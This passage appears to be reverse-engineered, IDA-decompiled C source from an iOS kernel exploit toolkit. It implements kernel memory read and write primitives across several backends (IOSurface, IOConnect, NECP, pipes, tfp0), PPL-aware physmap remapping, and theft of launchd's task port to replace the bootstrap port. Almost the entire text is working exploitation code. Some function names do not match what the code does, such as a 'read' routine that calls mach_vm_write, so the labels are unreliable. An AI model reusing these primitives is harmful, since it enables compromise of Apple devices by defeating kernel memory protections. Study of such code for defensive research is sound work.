      semaphore_t requestSemaphore = *(uint32_t *)(helper + 8);
      semaphore_t replySemaphore = *(uint32_t *)(helper + 12);
      if ( requestSemaphore + 1 >= 2 && replySemaphore + 1 >= 2 )
      {
        uint64_t *helperAddress = (uint64_t *)(helper + 32);
        *(uint64_t *)(helper + 32) = address;
        *(uint64_t *)(helper + 40) = (uint64_t)&writeValue;
        *(uint64_t *)(helper + 48) = 8;

        kern_return_t signalStatus = semaphore_signal(requestSemaphore);
        if ( signalStatus )
        {
          rawStatus = signalStatus | 0x80000000;
        }
        else
        {
          kern_return_t waitStatus = semaphore_timedwait(replySemaphore, IDA_MACH_TIMESPEC(3ULL));
          rawStatus = *(uint32_t *)(helper + 60);
          if ( !rawStatus )
            rawStatus = waitStatus ? waitStatus | 0x80000000 : 0;
        }

        *helperAddress = 0;
        *(uint64_t *)(helper + 40) = 0;
        *(uint64_t *)(helper + 48) = 0;
        if ( *(uint32_t *)(helper + 60) )
          teardown_semaphore_helper_ctx(krwCtx, 0);
      }
    }
  }

  int mappedRegionStatus = 708616;
  if ( krwCtx->mappedKernelRegion && krwCtx->mappedKernelSize )
  {
    mappedRegionStatus = 0;
    atomic_store(0, (unsigned __int8 *)(krwCtx->mappedKernelRegion + 1));
  }

  return (rawStatus ? rawStatus : mappedRegionStatus) == 0;
}

//----- (000000000002A0D0) ----------------------------------------------------
bool __fastcall kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t a2, __int64 a3)
{
  return kwrite64_last_arg(krwCtx, a2, a3, krwCtx->gap_0xC);
}

//----- (000000000002A0D8) ----------------------------------------------------
__int64 __fastcall pgtable_walk_and_physmap_remap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  struct
  {
    uint8_t unused[32];
    uint64_t paddr;
  } walk = {0};
  struct
  {
    uint64_t mappedAddress;
    uint8_t rest[48];
  } mapping = {0};

  if ( !pgtable_walk_wrapper(krwCtx, a2 & ~krwCtx->pageMask, &walk) )
    return 0;

  if ( physmap_map_cached(krwCtx, walk.paddr & 0xFFFFFFFFC000LL, (__int64)&mapping) )
  {
    if ( mapping.mappedAddress )
      physmap_unmap_cached(krwCtx, (__int64)&mapping);
    return 0;
  }

  *(uint64_t *)((krwCtx->pageMask & a2) + mapping.mappedAddress) = a3;
  if ( mapping.mappedAddress )
    physmap_unmap_cached(krwCtx, (__int64)&mapping);
  return 1;
}

//----- (000000000002A188) ----------------------------------------------------
__int64 __fastcall kwritebuf_last_arg_1(struct_krwCtx *krwCtx, __int64 address, const void *buf, mach_vm_size_t bufSize)
{
  return noppl_kwritebuf(krwCtx, address, buf, bufSize, 1);
}

//----- (000000000002A190) ----------------------------------------------------
unsigned __int64 __fastcall port_right_index_to_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 v2; // x19
  unsigned __int64 result; // x0
  __int64 v4; // x8
  __int64 v5; // x9
  int v6; // [xsp+Ch] [xbp-14h] BYREF

  v2 = a2;
  if ( !a2 )
    return 0;
  if ( (a2 & 0x80000000) != 0 )
  {
    v4 = krwCtx->gap_0x1F0;
    if ( v4 )
    {
      v5 = krwCtx->gap_0x1F8;
      if ( (uint32_t)v5 )
        return v4 + (a2 & 0x7FFFFFFF) * v5;
    }
    return 0;
  }
  result = kernel_va_base_resolver(krwCtx, 0, &v6);
  if ( result )
    result += v2 << v6;
  return result;
}

//----- (000000000002A200) ----------------------------------------------------
unsigned __int64 __fastcall decode_pte_to_physmap_addr(struct_krwCtx *krwCtx, unsigned __int64 a2, uint32_t *a3)
{
  bool v6; // cc
  int v7; // w9
  unsigned __int64 v8; // x8
  unsigned __int64 v9; // x11
  char v10; // w12
  __int64 v11; // x10
  __int64 v12; // x13
  __int64 v13; // x13
  __int64 v14; // x12
  __int64 v15; // x12
  __int64 v16; // x9
  unsigned __int64 v17; // x8

  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK) )
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFF9FFFFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFBFFFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 46;
      }
      else
      {
        v9 = 0xFFFF9FFFFFFFC000LL;
        v10 = 45;
      }
      v11 = 0x600000000000LL;
      v12 = 0x400000000000LL;
    }
    else
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFFFF9FFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFFFBFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 38;
      }
      else
      {
        v9 = 0xFFFFFF9FFFFFC000LL;
        v10 = 37;
      }
      v11 = 0x6000000000LL;
      v12 = 0x4000000000LL;
    }
    if ( v6 )
      v11 = v12;
    v13 = 3;
    if ( v7 )
      v13 = 1;
    v14 = v13 & (a2 >> v10);
    if ( v14 )
    {
      v15 = v14 << (a2 & 0xF);
      if ( v7 )
        v16 = ((a2 & 0x10) | 0x20) << (a2 & 0xF);
      else
        LODWORD(v16) = v15;
    }
    else
    {
      LODWORD(v16) = ((uint32_t)a2 << 14) & 0xFFFC000;
      v8 = v9;
    }
    *a3 = v16;
    return (v8 & a2) | v11;
  }
  else
  {
    v17 = HIWORD(a2);
    if ( (a2 & 0x800000000000LL) != 0 )
      LODWORD(v17) = HIWORD(a2) << 14;
    *a3 = v17;
    return a2 | 0xFFFF800000000000LL;
  }
}

//----- (000000000002A360) ----------------------------------------------------
bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr, mach_vm_size_t size, void *outBuf, __int64 a5)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64);
  int rawStatus;

  customKread = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, vaddr, outBuf, size, a5) == 0;

  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
         && *(uint64_t *)&krwCtx->ioConnectMappedAddr
         && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
  }
  else
  {
    return kreadbuf_via_tfp0(
             krwCtx->targetAndParentTaskPorts,
             vaddr,
             size,
             (unsigned int)krwCtx->vmMapSize,
             (__int64)outBuf,
             0) == 0;
  }

  return rawStatus == 0;
}

//----- (000000000002A480) ----------------------------------------------------
bool __fastcall kreadbuf_0(__int64 krwCtx, unsigned __int64 addr, mach_vm_size_t size, void *outBuf)
{
  return kreadbuf_universal(KRWCTX_FROM_UINTPTR(krwCtx), addr, size, outBuf, 0);
}

//----- (000000000002A488) ----------------------------------------------------
bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4, int a5)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, unsigned __int64, const void *, mach_vm_size_t, int);
  int rawStatus;

  TRACE_PORTS("noppl_kwritebuf enter ctx=%llx addr=%llx buf=%llx size=%llx a5=%d fn=%llx sptm_fd=%d sptm_ctx=%llx shm_port=%d shm_u=%llx shm_k=%llx necp_r=%d necp_w=%d pipe0=%d pipe1=%d iosurface_fd=%d necp=%llx tfp=%d chunk=%u\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              (unsigned long long)a4,
              a5,
              (unsigned long long)krwCtx->iogpuKwriteFn,
              krwCtx->threadForKernelRead,
              (unsigned long long)krwCtx->threadStateKrwPhysAddr,
              krwCtx->ioConnectPort,
              (unsigned long long)krwCtx->ioConnectMappedAddr,
              (unsigned long long)krwCtx->ioConnectMappedSize,
              krwCtx->krw_pipe_0,
              krwCtx->krw_pipe_1,
              krwCtx->pipeFd0,
              krwCtx->pipeFd1,
              krwCtx->iosurfaceFd_size4,
              (unsigned long long)krwCtx->gap_0x218,
              krwCtx->targetVmPort,
              krwCtx->vmMapSize_size4);

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
  {
    rawStatus = customKwrite(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", rawStatus);
    goto done;
  }

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", rawStatus);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = ioconnect_callmethod_write(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=ioconnect raw=%x\n", rawStatus);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd_size4 != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = necp_ioconnect_krw(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=necp raw=%x\n", rawStatus);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = pipe_pair_krw(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=pipe raw=%x\n", rawStatus);
  }
  else
  {
    rawStatus = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->vmMapSize_size4);
    TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", rawStatus, rawStatus == 0);
    return rawStatus == 0;
  }

done:
  TRACE_PORTS("noppl_kwritebuf exit raw=%x ok=%d\n", rawStatus, rawStatus == 0);
  return rawStatus == 0;
}

//----- (000000000002A56C) ----------------------------------------------------
bool __fastcall kwritebuf_last_0(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4)
{
  return noppl_kwritebuf(krwCtx, a2, a3, a4, 0);
}

//----- (000000000002A574) ----------------------------------------------------
mach_vm_address_t __fastcall ppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t a2, int a3)
{
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
    return noppl_kwrite32(krwCtx, a2, a3);

  int newBytes = a3;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    return ppl_kwritebuf(krwCtx, a2, &newBytes, 4);

  mach_vm_address_t remappedAddr = remap_kaddr_through_physmap(krwCtx, a2);
  if ( !remappedAddr )
    return 0;
  return noppl_kwrite32(krwCtx, remappedAddr, a3);
}

//----- (000000000002A63C) ----------------------------------------------------
int kwrite64_dispatch(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 new_value)
{
    // Version threshold: XNU_VERSION_PACKED(8019, 60, 40, 0, 0)
    // = 0x001F530F02800000
    if (krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0)) {

        // New path: check for specific CPU/capability flag 0x05184001
        if (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK)) {
            // Tail call — PAC-authenticated branch to ppl_kwrite_physmap_checked
            return ppl_kwrite_physmap_checked(krwCtx, address, new_value);
        }

        // Translate address via remap_kaddr_through_physmap
        uint64_t translated = remap_kaddr_through_physmap(krwCtx, address);
        if (!translated)
            return 0;  // retab with no value set → returns 0

        // Use translated address, fall through to kwrite64_last_arg
        address = translated;
        // fall through

    }

    // Old path (and new path fallthrough):
    // ldrb w3, [x20, #0xc]  →  4th arg = krwCtx->byte_0x0c
    uint8_t arg3 = krwCtx->gap_0xC;

    // Tail call
    return kwrite64_last_arg(krwCtx, address, new_value, arg3);
}
// 2A6A4: variable 'vars8' is possibly undefined

//----- (000000000002A714) ----------------------------------------------------
unsigned __int64 __fastcall kwritebuf_universal(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        const void *newBytes,
        mach_vm_size_t length)
{
  unsigned __int64 vaddr_; // x22
  struct_krwCtx *krwCtx_; // x21
  unsigned __int64 result; // x0

  vaddr_ = vaddr;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      return ppl_kwritebuf(krwCtx, vaddr_, (void *)newBytes, length);
    }
    result = remap_kaddr_through_physmap(krwCtx, vaddr_);
    if ( !result )
      return result;
    vaddr = result;
  }
  return noppl_kwritebuf(krwCtx, vaddr, newBytes, length, 1);
}
// 2A784: variable 'vars8' is possibly undefined

//----- (000000000002A7F4) ----------------------------------------------------
__int64 __fastcall mach_vm_read_with_attr_chunks(
        vm_map_t target_task,
        mach_vm_address_t address,
        __int64 a3,
        mach_vm_size_t size,
        unsigned int a5)
{
  uint32_t totalSize = size;
  uint32_t maxChunkSize = a5 ? a5 : totalSize;
  uint32_t remaining = totalSize;
  uint32_t offset = 0;

  while ( remaining )
  {
    mach_msg_type_number_t chunkSize = remaining >= maxChunkSize ? maxChunkSize : remaining;
    kern_return_t kr = mach_vm_write(target_task, address + offset, a3 + offset, chunkSize);
    if ( kr )
      return kr;
    offset += chunkSize;
    remaining -= chunkSize;
  }

  vm_machine_attribute_val_t value = 7;
  mach_vm_machine_attribute(target_task, address, totalSize, 1u, &value);
  return 0;
}

//----- (000000000002A8A4) ----------------------------------------------------
__int64 __fastcall pgtable_write_aligned(struct_krwCtx *krwCtx)
{
  if ( !krwCtx )
    return 708609;
  if ( bootstrap_port + 1 > 1 )
    return 0;

  __int64 status = 163843;
  mach_port_name_t launchdTaskPort = 0;
  if ( krw_task_for_pid(krwCtx, 1, &launchdTaskPort) )
  {
    ipc_info_space_t space_info;
    ipc_info_name_array_t table_info = 0;
    mach_msg_type_number_t table_infoCnt = 0;
    ipc_info_tree_name_array_t tree_info = 0;
    mach_msg_type_number_t tree_infoCnt = 0;
    memset(&space_info, 0, sizeof(space_info));
    kern_return_t kr = mach_port_space_info(launchdTaskPort, &space_info, &table_info, &table_infoCnt, &tree_info, &tree_infoCnt);
    if ( kr )
    {
      status = kr | 0x80000000;
    }
    else if ( table_infoCnt )
    {
      for ( mach_msg_type_number_t i = 0; i < table_infoCnt; ++i )
      {
        integer_t portAttributes[17] = {0};
        mach_msg_type_number_t portAttributesCnt = 17;
        mach_port_name_t name = table_info[i].iin_name;

        if ( (table_info[i].iin_type & 0x1F0000) != 0 && name + 1 >= 2 )
        {
          kr = mach_port_get_attributes(launchdTaskPort, name, 7, portAttributes, &portAttributesCnt);
          if ( !kr && portAttributes[3] == 128 && (~*((uint8_t *)portAttributes + 36) & 6) == 0 )
          {
            uint64_t portKobject = task_get_ipc_port(krwCtx, launchdTaskPort, name);
            if ( portKobject )
            {
              status = plist_elem_is_string_6(krwCtx, portKobject, &bootstrap_port);
              if ( !(uint32_t)status )
              {
                kr = task_set_special_port(mach_task_self_, 4, bootstrap_port);
                status = kr ? kr | 0x80000000 : 0;
              }
            }
            break;
          }
        }
      }
    }

    if ( table_info && table_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)table_info, 28LL * table_infoCnt);
    if ( tree_info && tree_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)tree_info, 36LL * tree_infoCnt);
    mach_port_deallocate(mach_task_self_, launchdTaskPort);
  }
  return status;
}

//----- (000000000002AABC) ----------------------------------------------------
__int64 __fastcall semaphore_timedwait_ns(__int64 a1, unsigned int a2)
{
  mach_timespec_t v2; // x1

  v2 = IDA_MACH_TIMESPEC((a2 / 0xF4240uLL) & 0x7FFFFFFFFLL
                       | ((unsigned __int64)((125 * (a2 % 0xF4240)) & 0x1FFFFFFF) << 35));
  if ( semaphore_timedwait(*(uint32_t *)(a1 + 612), v2) == 49 )
    return 0;
  else
    return 0xFFFFFFFFLL;
}

//----- (000000000002AB10) ----------------------------------------------------
__int64 vtable_trampoline_b()
{
  return 0LL;
}
